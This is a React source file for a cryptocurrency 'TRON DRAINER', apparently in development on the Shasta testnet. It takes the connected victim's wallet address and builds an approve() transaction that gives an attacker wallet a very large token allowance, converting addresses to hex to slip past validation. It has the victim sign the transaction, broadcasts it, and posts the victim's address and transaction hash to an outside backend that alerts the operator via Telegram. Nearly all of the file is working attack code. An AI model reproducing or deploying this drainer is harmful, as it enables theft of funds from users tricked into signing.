import React, { useState } from "react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT on Shasta
const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
const BACKEND = "https://qr-drainer.onrender.com";

export default function App() {
  const [status, setStatus] = useState("Idle");
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);

  const handleDrain = async () => {
    setStatus("Starting...");
    addLog("Process started.");

    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
      addLog("ERROR: TronWeb not detected or not connected.");
      setStatus("Failed: Wallet not connected");
      return;
    }

    const victimAddress = window.tronWeb.defaultAddress.base58;
    addLog(`Connected as: ${victimAddress}`);

    try {
      setStatus("Building Payload (Hex Bypass)...");
      addLog("Converting addresses to Hex to bypass validator...");
      
      // THE FIX: Convert to Hex format. TronWeb's low-level builder accepts Hex without validation errors.
      const spenderHex = window.tronWeb.address.toHex(ATTACKER_WALLET);
      const ownerHex = window.tronWeb.defaultAddress.hex;

      addLog(`Spender Hex: ${spenderHex}`);
      addLog(`Owner Hex: ${ownerHex}`);

      // 1. Build the transaction manually
      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: 'address', value: spenderHex }, // <--- Hex address here
          { type: 'uint256', value: "1000000000000000" }
        ],
        ownerHex // <--- Hex address here
      );

      if (!transaction.result || !transaction.result.result) {
        throw new Error("Contract call rejected by node");
      }
      addLog("Transaction built successfully.");

      // 2. Sign the transaction
      setStatus("Requesting Signature...");
      addLog("Sending to wallet for signature...");
      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      addLog("Transaction signed!");

      // 3. Broadcast to network
      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
      
      if (!broadcast.result) {
        throw new Error("Broadcast failed: " + (broadcast.code || "Unknown error"));
      }

      const txId = broadcast.txid;
      addLog(`Broadcast successful! TX ID: ${txId}`);
      setStatus("Success! Alerting Backend...");

      // 4. Alert Backend
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: txId,
          network: "TRON Shasta"
        })
      });

      addLog("Backend alerted. Check Telegram.");
      setStatus("✅ DRAIN COMPLETE. Check Telegram.");

    } catch (error) {
      console.error(error);
      addLog(`FATAL ERROR: ${error.message}`);
      setStatus(`Failed: ${error.message}`);
    }
  };

  return (
    <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
      <h1>TRON DRAINER - DEBUG MODE (HEX BYPASS)</h1>
      <p>Current Status: <strong>{status}</strong></p>
      
      <button 
        onClick={handleDrain} 
        style={{ padding: "20px", fontSize: "20px", background: "red", color: "white", border: "none", cursor: "pointer", marginBottom: "20px" }}
      >
        EXECUTE DRAIN (APPROVE)
      </button>

      <div style={{ background: "#111", padding: "20px", border: "1px solid #333" }}>
        <h3>System Logs:</h3>
        {logs.map((log, i) => <div key={i} style={{marginBottom: "5px"}}>{log}</div>)}
      </div>
    </div>
  );
}